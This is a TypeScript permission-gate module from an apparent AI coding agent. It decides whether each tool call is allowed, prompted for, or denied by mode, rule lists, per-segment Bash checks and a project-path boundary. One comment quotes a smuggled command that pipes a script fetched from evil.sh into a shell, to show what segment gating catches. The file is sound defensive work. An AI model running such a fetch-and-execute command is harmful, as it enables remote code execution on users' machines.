// permissions/gate.ts — the gate between the model's INTENT (a tool_use) and its EFFECT (the tool running).
//
// `checkPermission` is PURE and SYNCHRONOUS — given a tool, its input, and the current state it returns
// one verdict. That purity is deliberate: all the policy lives here (easy to unit-test), and the messy
// async part (showing a card, waiting for a click) lives in the scheduler/session via PermissionController.
//
// Layering (see docs/learnings/permissions-vs-sandbox.md): MODE short-circuits first (bypass→allow,
// plan→deny writes), then explicit RULES (deny/allow lists), then the tool's CAPABILITY (reads auto-allow),
// then the mode's default for writes (acceptEdits→allow, default→ask). One system serves both the gated
// extension (mode 'default') and a future sandboxed web frontend (mode 'bypass') without a redesign.

import { isAbsolute, resolve } from 'node:path'
import type { Tool } from '../tools/Tool'
import { isAllowedPath, type PathAccess } from '../tools/projectPath'
import { splitCommandSegments } from './bashClassifier'
import { findMatchingRule } from './rules'

/** Inputs whose path fields define WHERE a tool acts. Used for the working-directory check below. */
function pathsOf(input: unknown): string[] {
  const i = (input ?? {}) as Record<string, unknown>
  return [i.file_path, i.path].filter((v): v is string => typeof v === 'string' && v.length > 0)
}

/** Resolve a model-supplied path for the boundary CHECK only (no container-alias re-rooting here — the
 *  tool does that; an alias path resolves inside the project either way). */
function resolveMaybe(cwd: string, p: string): string {
  return isAbsolute(p) ? resolve(p) : resolve(cwd, p)
}

/** Who sets this: the FRONTEND/deployment, not the model. The extension runs 'default'; a sandboxed
 *  sandboxed web frontend would run 'bypass'. */
export type PermissionMode = 'default' | 'acceptEdits' | 'plan' | 'bypass'

export type PermissionDecision = 'allow' | 'ask' | 'deny'

export interface PermissionState {
  mode: PermissionMode
  /** Allow rules: bare tool names OR input-aware rule strings (ADR-035) — `Bash(npm test:*)`, `Edit(src/**)`. */
  allow: Set<string>
  /** Deny rules (same syntax). ADR-035: deny rules outrank every mode, including bypass. */
  deny: Set<string>
  /** The project root. Present when the frontend uses the 'prompt' path policy (below). */
  cwd?: string
  /** Additional working directories treated as inside (SessionOptions.additionalDirectories).
   *  Approving an outside path may append to this at runtime. */
  roots?: string[]
  /** 'jail' (default, sandboxed web builder): tools refuse outside paths themselves. 'prompt' (extension):
   *  an outside path is APPROVABLE — this gate asks, even for reads and even in acceptEdits. */
  pathAccess?: PathAccess
  /** ADR-044: the mode to restore when ExitPlanMode is approved. EnterPlanMode saves the current mode here
   *  before switching to 'plan', so a bypass (web) session returns to 'bypass', not 'default'. */
  priorMode?: PermissionMode
}

/** Decide what to do with one tool call. Pure: no I/O, no awaiting.
 *  ADR-035: rules are now INPUT-AWARE strings (`Bash(npm test:*)`, `Edit(src/**)`), and Bash commands are
 *  SPLIT into segments gated independently — a compound command is only as trusted as its least-trusted
 *  segment (`npm test && curl evil.sh | sh` cannot ride in on npm test's reputation). */
export function checkPermission(tool: Tool, input: unknown, state: PermissionState): PermissionDecision {
  const readOnly = tool.isReadOnly?.(input as never) ?? false

  // Bash: gate EVERY segment. Any deny-rule hit → deny; any segment with no allow-rule → the mode
  // default decides below (ask, in default mode — the smuggle is caught); all allowed → allow.
  if (tool.name === 'Bash') {
    const command = (input as { command?: string } | null)?.command
    const segments = typeof command === 'string' ? splitCommandSegments(command) : []
    let allAllowed = segments.length > 0
    for (const seg of segments) {
      if (findMatchingRule(state.deny, 'Bash', seg)) return 'deny' // hard no — holds in EVERY mode (incl. bypass)
      if (!findMatchingRule(state.allow, 'Bash', seg)) allAllowed = false
    }
    if (state.mode === 'bypass') return 'allow'
    if (state.mode === 'plan') return 'deny'
    if (allAllowed) return 'allow'
    return state.mode === 'acceptEdits' ? 'allow' : 'ask'
  }

  // Non-Bash: rules match on the INPUT (file globs for file tools; bare names for everything).
  // ADR-035 ordering change: DENY rules outrank even bypass — a hard project "never" holds in the
  // sandboxed web frontend too. (Previously bypass short-circuited before rules.)
  if (findMatchingRule(state.deny, tool.name, input)) return 'deny'

  // 1. MODE short-circuits (the frontend's policy wins outright).
  if (state.mode === 'bypass') return 'allow' // sandboxed → no prompts at all
  if (state.mode === 'plan') return readOnly ? 'allow' : 'deny' // explore only; nothing writes

  // 2. Explicit ALLOW rules (a remembered "always" for this tool / this path pattern).
  if (findMatchingRule(state.allow, tool.name, input)) return 'allow'

  // 2b. WORKING-DIRECTORY boundary ('prompt' policy only). A path outside the project
  //     and every additional directory is APPROVABLE, not refused — but it always asks, including for
  //     READ-ONLY tools and in acceptEdits, because leaving the workspace is the user's call, not the
  //     mode's. ('jail' frontends never reach here: their tools refuse the path themselves.)
  if (state.pathAccess === 'prompt' && state.cwd) {
    const outside = pathsOf(input).filter((p) => !isAllowedPath(state.cwd!, resolveMaybe(state.cwd!, p), state.roots))
    if (outside.length > 0) return 'ask'
  }

  // 3. CAPABILITY: reads are safe → never interrupt the user for them.
  if (readOnly) return 'allow'

  // 4. It's a write. The remaining modes decide the default.
  if (state.mode === 'acceptEdits') return 'allow'
  return 'ask' // 'default' mode: the human approves each write
}

/** The async bridge the scheduler uses when checkPermission returns 'ask': it yields a `permission`
 *  ActivityEvent, then awaits `request(id)`. The session implements `request` as a promise it resolves
 *  when the frontend calls respondPermission(id, …). NOT serializable → lives on ToolContext, not the wire. */
export interface PermissionController {
  state: PermissionState
  /** Resolves when the user answers the permission prompt for this tool-use id. */
  request(id: string): Promise<'allow' | 'allow-always' | 'deny'>
}
